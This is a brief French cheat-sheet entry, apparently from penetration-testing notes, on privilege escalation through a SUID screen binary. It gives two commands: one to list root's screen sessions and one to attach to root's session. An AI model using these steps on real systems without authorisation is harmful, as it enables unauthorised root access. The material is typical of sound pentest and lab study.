# PE : screen (SUID)

Si l'utilisateur `root` à créer un `screen` et que cet exécutable est SUID alors il est possible pour un utilisateur d'élever ses privilèges.

### Exemple

```
ps aux | grep screen # permet de récupérer le nom et le pid du screen
screen -x root/<PID>.<SCREEN-NAME> ou screen -r root/<SCREEN-NAME>
```
